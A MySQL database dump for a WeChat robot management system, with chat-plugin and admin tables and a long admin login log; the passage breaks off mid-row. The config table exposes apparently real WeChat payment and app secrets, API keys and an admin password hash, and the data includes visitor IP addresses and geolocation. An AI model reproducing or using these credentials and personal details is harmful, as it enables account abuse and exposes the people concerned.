-- MySQL dump 10.13  Distrib 5.6.50, for Linux (x86_64)
--
-- Host: localhost    Database: manage_robot
-- ------------------------------------------------------
-- Server version	5.6.50-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `mirrormx_customer_chat_department`
--

DROP TABLE IF EXISTS `mirrormx_customer_chat_department`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mirrormx_customer_chat_department` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(64) NOT NULL,
  `description` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mirrormx_customer_chat_department`
--

LOCK TABLES `mirrormx_customer_chat_department` WRITE;
/*!40000 ALTER TABLE `mirrormx_customer_chat_department` DISABLE KEYS */;
/*!40000 ALTER TABLE `mirrormx_customer_chat_department` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mirrormx_customer_chat_message`
--

DROP TABLE IF EXISTS `mirrormx_customer_chat_message`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mirrormx_customer_chat_message` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `from_id` int(11) NOT NULL,
  `to_id` int(11) NOT NULL,
  `body` text NOT NULL,
  `datetime` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `talk_id` int(10) unsigned NOT NULL,
  `extra` text,
  PRIMARY KEY (`id`),
  KEY `message_fk_talk` (`talk_id`),
  KEY `message_from_id_ix` (`from_id`),
  KEY `message_to_id_ix` (`to_id`),
  KEY `message_datetime_ix` (`datetime`),
  CONSTRAINT `message_fk_talk` FOREIGN KEY (`talk_id`) REFERENCES `mirrormx_customer_chat_talk` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mirrormx_customer_chat_message`
--

LOCK TABLES `mirrormx_customer_chat_message` WRITE;
/*!40000 ALTER TABLE `mirrormx_customer_chat_message` DISABLE KEYS */;
/*!40000 ALTER TABLE `mirrormx_customer_chat_message` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mirrormx_customer_chat_talk`
--

DROP TABLE IF EXISTS `mirrormx_customer_chat_talk`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mirrormx_customer_chat_talk` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `state` varchar(32) DEFAULT NULL,
  `department_id` smallint(5) unsigned DEFAULT NULL,
  `owner` int(11) DEFAULT NULL,
  `last_activity` timestamp NULL DEFAULT NULL ON UPDATE CURRENT_TIMESTAMP,
  `extra` text,
  PRIMARY KEY (`id`),
  KEY `talk_fk_department` (`department_id`),
  KEY `talk_owner_ix` (`owner`),
  KEY `talk_last_activity_ix` (`last_activity`),
  CONSTRAINT `talk_fk_department` FOREIGN KEY (`department_id`) REFERENCES `mirrormx_customer_chat_department` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mirrormx_customer_chat_talk`
--

LOCK TABLES `mirrormx_customer_chat_talk` WRITE;
/*!40000 ALTER TABLE `mirrormx_customer_chat_talk` DISABLE KEYS */;
/*!40000 ALTER TABLE `mirrormx_customer_chat_talk` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `mirrormx_customer_chat_user`
--

DROP TABLE IF EXISTS `mirrormx_customer_chat_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `mirrormx_customer_chat_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(32) NOT NULL,
  `mail` varchar(64) NOT NULL,
  `password` varchar(255) NOT NULL,
  `image` varchar(255) DEFAULT NULL,
  `info` text,
  `roles` varchar(128) DEFAULT NULL,
  `last_activity` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `user_mail_ix` (`mail`),
  KEY `user_last_activity_ix` (`last_activity`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `mirrormx_customer_chat_user`
--

LOCK TABLES `mirrormx_customer_chat_user` WRITE;
/*!40000 ALTER TABLE `mirrormx_customer_chat_user` DISABLE KEYS */;
INSERT INTO `mirrormx_customer_chat_user` VALUES (1,'admin','admin','e86e685ea0ff10e1ea942ba647e63fea2383fa0b',NULL,'{\"ip\":\"127.0.0.1\"}','ADMIN,OPERATOR','2020-01-17 16:06:34'),(2,'anonymous-1576222526','no@e.mail.provided','x',NULL,'{\"ip\":\"113.98.116.92\",\"referer\":\"http:\\/\\/qd2.hskj2016.com\\/customlivechat\\/php\\/app.php?widget-test\",\"userAgent\":\"Mozilla\\/5.0 (Windows NT 6.1) AppleWebKit\\/537.36 (KHTML, like Gecko) Chrome\\/78.0.3904.108 Safari\\/537.36\",\"browserName\":\"chrome\",\"browserVersion\":\"78.0\",\"os\":\"windows\",\"engine\":\"webkit\",\"language\":\"zh\",\"geoloc\":{\"countryCode\":\"CN\",\"countryName\":\"China\",\"regionCode\":\"44\",\"regionName\":\"Guangdong\",\"city\":\"Guangzhou\",\"zipCode\":null,\"timeZone\":\"Asia\\/Shanghai\",\"latitude\":23.1167,\"longitude\":113.25,\"metroCode\":null,\"utcOffset\":-480}}','GUEST','2019-12-13 08:13:03');
/*!40000 ALTER TABLE `mirrormx_customer_chat_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_auth`
--

DROP TABLE IF EXISTS `system_auth`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_auth` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `title` varchar(20) DEFAULT NULL COMMENT '权限名称',
  `status` tinyint(1) unsigned DEFAULT '1' COMMENT '权限状态',
  `sort` bigint(20) unsigned DEFAULT '0' COMMENT '排序权重',
  `desc` varchar(255) DEFAULT '' COMMENT '备注说明',
  `create_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_auth_status` (`status`) USING BTREE,
  KEY `index_system_auth_title` (`title`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COMMENT='系统-权限';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_auth`
--

LOCK TABLES `system_auth` WRITE;
/*!40000 ALTER TABLE `system_auth` DISABLE KEYS */;
INSERT INTO `system_auth` VALUES (1,'管理员',1,0,'管理权限','2019-10-17 06:04:15');
/*!40000 ALTER TABLE `system_auth` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_auth_node`
--

DROP TABLE IF EXISTS `system_auth_node`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_auth_node` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `auth` bigint(20) unsigned DEFAULT NULL COMMENT '角色',
  `node` varchar(200) DEFAULT NULL COMMENT '节点',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_auth_auth` (`auth`) USING BTREE,
  KEY `index_system_auth_node` (`node`(191)) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=2362 DEFAULT CHARSET=utf8mb4 COMMENT='系统-权限-授权';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_auth_node`
--

LOCK TABLES `system_auth_node` WRITE;
/*!40000 ALTER TABLE `system_auth_node` DISABLE KEYS */;
INSERT INTO `system_auth_node` VALUES (2310,1,'admin'),(2311,1,'admin/auth'),(2312,1,'admin/auth/index'),(2313,1,'admin/auth/apply'),(2314,1,'admin/auth/add'),(2315,1,'admin/auth/edit'),(2316,1,'admin/auth/refresh'),(2317,1,'admin/auth/forbid'),(2318,1,'admin/auth/resume'),(2319,1,'admin/auth/remove'),(2320,1,'admin/config'),(2321,1,'admin/config/info'),(2322,1,'admin/config/communication'),(2323,1,'admin/config/clear'),(2324,1,'admin/config/config'),(2325,1,'admin/config/file'),(2326,1,'admin/index'),(2327,1,'admin/index/main'),(2328,1,'admin/index/clearruntime'),(2329,1,'admin/index/buildoptimize'),(2330,1,'admin/menu'),(2331,1,'admin/menu/index'),(2332,1,'admin/menu/add'),(2333,1,'admin/menu/edit'),(2334,1,'admin/menu/resume'),(2335,1,'admin/menu/forbid'),(2336,1,'admin/menu/remove'),(2337,1,'admin/queue'),(2338,1,'admin/queue/index'),(2339,1,'admin/queue/redo'),(2340,1,'admin/queue/processstart'),(2341,1,'admin/queue/processstop'),(2342,1,'admin/queue/remove'),(2343,1,'admin/reply'),(2344,1,'admin/reply/index'),(2345,1,'admin/reply/add_reply'),(2346,1,'admin/reply/edit_reply'),(2347,1,'admin/reply/delete_reply'),(2348,1,'admin/user'),(2349,1,'admin/user/index'),(2350,1,'admin/user/add'),(2351,1,'admin/user/edit'),(2352,1,'admin/user/pass'),(2353,1,'admin/user/forbid'),(2354,1,'admin/user/resume'),(2355,1,'admin/user/remove'),(2356,1,'admin/users'),(2357,1,'admin/users/index'),(2358,1,'admin/users/friend'),(2359,1,'admin/users/group'),(2360,1,'admin/users/do_group'),(2361,1,'admin/users/send_message');
/*!40000 ALTER TABLE `system_auth_node` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_config`
--

DROP TABLE IF EXISTS `system_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_config` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT '' COMMENT '配置名',
  `value` varchar(500) DEFAULT '' COMMENT '配置值',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_config_name` (`name`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=81 DEFAULT CHARSET=utf8mb4 COMMENT='系统-配置';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_config`
--

LOCK TABLES `system_config` WRITE;
/*!40000 ALTER TABLE `system_config` DISABLE KEYS */;
INSERT INTO `system_config` VALUES (1,'app_name','微信机器人管理系统'),(2,'site_name','微信机器人管理系统'),(3,'app_version','V1'),(4,'site_copy','©微信机器人管理系统'),(5,'site_icon','http://manage.robot.com/upload/c1751ea2d79be2e1/960969d90f9eba71.png'),(7,'miitbeian','暂无'),(8,'storage_type','local'),(9,'storage_local_exts','doc,gif,icon,jpg,mp3,mp4,p12,pem,png,rar'),(10,'storage_qiniu_bucket','https'),(11,'storage_qiniu_domain','用你自己的吧'),(12,'storage_qiniu_access_key','用你自己的吧'),(13,'storage_qiniu_secret_key','用你自己的吧'),(14,'storage_oss_bucket','cuci-mytest'),(15,'storage_oss_endpoint','oss-cn-hangzhou.aliyuncs.com'),(16,'storage_oss_domain','用你自己的吧'),(17,'storage_oss_keyid','用你自己的吧'),(18,'storage_oss_secret','用你自己的吧'),(36,'storage_oss_is_https','http'),(43,'storage_qiniu_region','华东'),(44,'storage_qiniu_is_https','https'),(45,'wechat_mch_id','1332187001'),(46,'wechat_mch_key','A82DC5BD1F3359081049C568D8502BC5'),(47,'wechat_mch_ssl_type','p12'),(48,'wechat_mch_ssl_p12','65b8e4f56718182d/1bc857ee646aa15d.p12'),(49,'wechat_mch_ssl_key','cc2e3e1345123930/c407d033294f283d.pem'),(50,'wechat_mch_ssl_cer','966eaf89299e9c95/7014872cc109b29a.pem'),(51,'wechat_token','mytoken'),(52,'wechat_appid','wx60a43dd8161666d4'),(53,'wechat_appsecret','9978422e0e431643d4b42868d183d60b'),(54,'wechat_encodingaeskey',''),(55,'wechat_push_url','消息推送地址：http://127.0.0.1:8000/wechat/api.push'),(56,'wechat_type','thr'),(57,'wechat_thr_appid','wx60a43dd8161666d4'),(58,'wechat_thr_appkey','5caf4b0727f6e46a7e6ccbe773cc955d'),(60,'wechat_thr_appurl','消息推送地址：http://127.0.0.1:2314/wechat/api.push'),(61,'component_appid','wx28b58798480874f9'),(62,'component_appsecret','8d0e1ec14ea0adc5027dd0ad82c64bc9'),(63,'component_token','P8QHTIxpBEq88IrxatqhgpBm2OAQROkI'),(64,'component_encodingaeskey','L5uFIa0U6KLalPyXckyqoVIJYLhsfrg8k9YzybZIHsx'),(65,'system_message_state','0'),(66,'sms_zt_username','可以找CUCI申请'),(67,'sms_zt_password','可以找CUCI申请'),(68,'sms_reg_template','您的验证码为{code}，请在十分钟内完成操作！'),(69,'sms_secure','可以找CUCI申请'),(70,'store_title','测试商城'),(71,'store_order_wait_time','0.50'),(72,'store_order_clear_time','24.00'),(73,'store_order_confirm_time','60.00'),(74,'sms_zt_username2','可以找CUCI申请2'),(75,'sms_zt_password2','可以找CUCI申请2'),(76,'sms_secure2','可以找CUCI申请2'),(77,'sms_reg_template2','您的验证码为{code}，请在十分钟内完成操作！2'),(78,'michat_appid','2882303761518074614'),(79,'michat_appkey','5861807470614'),(80,'michat_appsecert','CP/WUTUgDuyOxgLQ5ztesg==');
/*!40000 ALTER TABLE `system_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_data`
--

DROP TABLE IF EXISTS `system_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_data` (
  `id` bigint(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) DEFAULT NULL COMMENT '配置名',
  `value` longtext COMMENT '配置值',
  PRIMARY KEY (`id`) USING BTREE,
  KEY `index_system_data_name` (`name`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8mb4 COMMENT='系统-数据';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_data`
--

LOCK TABLES `system_data` WRITE;
/*!40000 ALTER TABLE `system_data` DISABLE KEYS */;
INSERT INTO `system_data` VALUES (1,'menudata','[{\"name\":\"请输入名称\",\"type\":\"scancode_push\",\"key\":\"scancode_push\"}]');
/*!40000 ALTER TABLE `system_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `system_log`
--

DROP TABLE IF EXISTS `system_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `system_log` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `node` varchar(200) NOT NULL DEFAULT '' COMMENT '当前操作节点',
  `geoip` varchar(15) NOT NULL DEFAULT '' COMMENT '操作者IP地址',
  `action` varchar(200) NOT NULL DEFAULT '' COMMENT '操作行为名称',
  `content` varchar(1024) NOT NULL DEFAULT '' COMMENT '操作内容描述',
  `username` varchar(50) NOT NULL DEFAULT '' COMMENT '操作人用户名',
  `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB AUTO_INCREMENT=318 DEFAULT CHARSET=utf8mb4 COMMENT='系统-日志';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `system_log`
--

LOCK TABLES `system_log` WRITE;
/*!40000 ALTER TABLE `system_log` DISABLE KEYS */;
INSERT INTO `system_log` VALUES (148,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-24 17:54:31'),(149,'admin/login/index','117.22.160.110','系统管理','用户登录系统成功','admin','2021-02-24 18:18:34'),(150,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-24 18:35:53'),(151,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-24 19:47:02'),(152,'admin/login/index','61.158.208.3','系统管理','用户登录系统成功','admin','2021-02-25 03:30:31'),(153,'admin/login/index','117.22.160.231','系统管理','用户登录系统成功','admin','2021-02-25 03:35:22'),(154,'admin/login/index','61.158.208.3','系统管理','用户登录系统成功','admin','2021-02-25 04:51:37'),(155,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 05:13:55'),(156,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 06:24:43'),(157,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 06:58:45'),(158,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 07:21:57'),(159,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 08:54:19'),(160,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 09:12:31'),(161,'admin/login/index','47.242.155.226','系统管理','用户登录系统成功','admin','2021-02-25 09:46:50'),(162,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 10:19:35'),(163,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 10:34:35'),(164,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 11:03:19'),(165,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 13:16:55'),(166,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 13:49:18'),(167,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 14:11:08'),(168,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-25 15:25:46'),(169,'admin/login/index','117.22.160.231','系统管理','用户登录系统成功','admin','2021-02-25 20:46:35'),(170,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 02:59:48'),(171,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 03:54:51'),(172,'admin/login/index','117.22.160.231','系统管理','用户登录系统成功','admin','2021-02-26 04:10:40'),(173,'admin/login/index','47.241.8.215','系统管理','用户登录系统成功','admin','2021-02-26 05:11:08'),(174,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 07:54:17'),(175,'admin/login/index','61.158.208.3','系统管理','用户登录系统成功','admin','2021-02-26 09:32:09'),(176,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 10:08:01'),(177,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 10:18:56'),(178,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 10:40:56'),(179,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 10:44:32'),(180,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 11:11:40'),(181,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 12:01:22'),(182,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 12:14:44'),(183,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 14:42:41'),(184,'admin/login/index','42.231.98.96','系统管理','用户登录系统成功','admin','2021-02-26 16:13:17'),(185,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 00:30:08'),(186,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 01:25:09'),(187,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 03:22:03'),(188,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 03:45:49'),(189,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 03:50:31'),(190,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 04:34:56'),(191,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 06:14:46'),(192,'admin/login/index','42.239.134.6','系统管理','用户登录系统成功','admin','2021-02-27 06:41:09'),(193,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-27 08:54:54'),(194,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-27 10:15:13'),(195,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 14:00:31'),(196,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 14:49:54'),(197,'admin/login/index','117.22.85.76','系统管理','用户登录系统成功','admin','2021-02-27 15:09:38'),(198,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 15:24:37'),(199,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 15:30:47'),(200,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 16:14:02'),(201,'admin/login/index','223.89.255.114','系统管理','用户登录系统成功','admin','2021-02-27 16:43:02'),(202,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 01:16:45'),(203,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 02:50:17'),(204,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 03:41:43'),(205,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 04:07:24'),(206,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 05:07:57'),(207,'admin/login/index','36.44.127.84','系统管理','用户登录系统成功','admin','2021-02-28 09:20:38'),(208,'admin/login/index','39.149.128.240','系统管理','用户登录系统成功','admin','2021-02-28 09:35:11'),(209,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 10:17:49'),(210,'admin/login/index','123.139.80.32','系统管理','用户登录系统成功','admin','2021-02-28 10:40:09'),(211,'admin/login/index','39.149.128.240','系统管理','用户登录系统成功','admin','2021-02-28 11:30:43'),(212,'admin/login/index','47.241.8.215','系统管理','用户登录系统成功','admin','2021-02-28 12:28:17'),(213,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 16:25:12'),(214,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 17:09:29'),(215,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 17:26:36'),(216,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-02-28 23:56:49'),(217,'admin/login/index','61.158.152.195','系统管理','用户登录系统成功','admin','2021-03-01 06:12:55'),(218,'admin/login/index','120.194.193.165','系统管理','用户登录系统成功','admin','2021-03-01 08:52:52'),(219,'admin/login/index','61.158.152.97','系统管理','用户登录系统成功','admin','2021-03-01 11:55:16'),(220,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-01 12:59:38'),(221,'admin/login/index','47.242.45.143','系统管理','用户登录系统成功','admin','2021-03-01 13:07:32'),(222,'admin/login/index','47.241.8.215','系统管理','用户登录系统成功','admin','2021-03-01 14:29:10'),(223,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-01 17:03:22'),(224,'admin/login/index','223.89.255.50','系统管理','用户登录系统成功','admin','2021-03-01 17:46:06'),(225,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-02 01:11:00'),(226,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-02 01:19:54'),(227,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-02 02:04:15'),(228,'admin/login/index','61.158.149.145','系统管理','用户登录系统成功','admin','2021-03-02 03:03:19'),(229,'admin/login/index','61.158.152.235','系统管理','用户登录系统成功','admin','2021-03-02 08:08:10'),(230,'admin/login/index','117.22.84.103','系统管理','用户登录系统成功','admin','2021-03-02 11:05:20'),(231,'admin/login/index','47.241.8.215','系统管理','用户登录系统成功','admin','2021-03-02 14:35:45'),(232,'admin/login/index','61.158.152.235','系统管理','用户登录系统成功','admin','2021-03-02 17:56:31'),(233,'admin/login/index','61.158.152.235','系统管理','用户登录系统成功','admin','2021-03-03 00:14:51'),(234,'admin/login/index','61.158.152.235','系统管理','用户登录系统成功','admin','2021-03-03 05:47:47'),(235,'admin/login/index','47.241.8.215','系统管理','用户登录系统成功','admin','2021-03-03 11:23:51'),(236,'admin/login/index','61.158.152.235','系统管理','用户登录系统成功','admin','2021-03-04 08:33:39'),(237,'admin/login/index','223.89.255.48','系统管理','用户登录系统成功','admin','2021-03-05 02:21:18'),(238,'admin/login/index','42.231.99.114','系统管理','用户登录系统成功','admin','2021-03-06 17:24:05'),(239,'admin/login/index','223.89.255.125','系统管理','用户登录系统成功','admin','2021-03-08 16:03:40'),(240,'admin/login/index','223.89.255.125','系统管理','用户登录系统成功','admin','2021-03-08 18:08:42'),(241,'admin/login/index','180.152.236.164','系统管理','用户登录系统成功','admin','2021-03-09 16:43:14'),(242,'admin/login/index','61.158.208.46','系统管理','用户登录系统成功','admin','2021-03-10 05:06:39'),(243,'admin/login/index','61.158.148.16','系统管理','用户登录系统成功','admin','2021-03-12 06:08:14'),(244,'admin/login/index','61.158.148.16','系统管理','用户登录系统成功','admin','2021-03-12 09:48:56'),(245,'admin/login/index','61.158.148.16','系统管理','用户登录系统成功','admin','2021-03-13 03:02:48'),(246,'admin/login/index','42.231.99.73','系统管理','用户登录系统成功','admin','2021-03-13 06:54:00'),(247,'admin/login/index','42.231.99.73','系统管理','用户登录系统成功','admin','2021-03-13 16:05:38'),(248,'admin/login/index','42.231.99.73','系统管理','用户登录系统成功','admin','2021-03-13 16:08:45'),(249,'admin/login/index','42.239.132.3','系统管理','用户登录系统成功','admin','2021-03-14 06:34:14'),(250,'admin/login/index','42.239.132.3','系统管理','用户登录系统成功','admin','2021-03-15 12:44:15'),(251,'admin/login/index','42.231.97.211','系统管理','用户登录系统成功','admin','2021-03-16 05:12:34'),(252,'admin/login/index','42.239.132.195','系统管理','用户登录系统成功','admin','2021-03-17 05:22:43'),(253,'admin/login/index','42.239.132.195','系统管理','用户登录系统成功','admin','2021-03-17 06:04:31'),(254,'admin/login/index','42.239.132.195','系统管理','用户登录系统成功','admin','2021-03-17 06:20:35'),(255,'admin/login/index','42.239.132.195','系统管理','用户登录系统成功','admin','2021-03-17 08:01:34'),(256,'admin/login/index','61.158.152.74','系统管理','用户登录系统成功','admin','2021-03-17 10:48:28'),(257,'admin/login/index','61.158.152.74','系统管理','用户登录系统成功','admin','2021-03-17 10:55:49'),(258,'admin/login/index','61.158.148.11','系统管理','用户登录系统成功','admin','2021-03-18 06:33:51'),(259,'admin/login/index','61.158.148.11','系统管理','用户登录系统成功','admin','2021-03-18 09:05:01'),(260,'admin/login/index','61.158.148.11','系统管理','用户登录系统成功','admin','2021-03-18 15:07:48'),(261,'admin/login/index','61.158.148.11','系统管理','用户登录系统成功','admin','2021-03-18 15:14:42'),(262,'admin/login/index','61.158.149.69','系统管理','用户登录系统成功','admin','2021-03-19 09:05:05'),(263,'admin/login/index','61.158.149.69','系统管理','用户登录系统成功','admin','2021-03-19 10:37:12'),(264,'admin/login/index','61.158.149.69','系统管理','用户登录系统成功','admin','2021-03-19 21:12:03'),(265,'admin/login/index','61.158.149.69','系统管理','用户登录系统成功','admin','2021-03-20 03:27:20'),(266,'admin/login/index','61.158.208.190','系统管理','用户登录系统成功','admin','2021-03-30 10:54:56'),(267,'admin/login/index','223.89.255.65','系统管理','用户登录系统成功','admin','2021-03-30 13:10:03'),(268,'admin/login/index','61.158.208.190','系统管理','用户登录系统成功','admin','2021-03-31 12:07:19'),(269,'admin/login/index','223.89.255.42','系统管理','用户登录系统成功','admin','2021-04-01 11:56:01'),(270,'admin/login/index','42.231.97.177','系统管理','用户登录系统成功','admin','2021-04-06 13:10:56'),(271,'admin/login/index','42.231.97.177','系统管理','用户登录系统成功','admin','2021-04-07 06:45:42'),(272,'admin/login/index','61.158.152.202','系统管理','用户登录系统成功','admin','2021-04-20 16:02:11'),(273,'admin/login/index','61.158.152.202','系统管理','用户登录系统成功','admin','2021-04-22 09:26:03'),(274,'admin/login/index','61.158.152.202','系统管理','用户登录系统成功','admin','2021-04-22 17:58:38'),(275,'admin/login/index','61.158.152.202','系统管理','用户登录系统成功','admin','2021-04-22 23:13:46'),(276,'admin/login/index','223.89.255.39','系统管理','用户登录系统成功','admin','2021-04-24 05:22:25'),(277,'admin/login/index','223.89.255.104','系统管理','用户登录系统成功','admin','2021-04-25 10:49:40'),(278,'admin/login/index','180.174.132.173','系统管理','用户登录系统成功','admin','2021-06-11 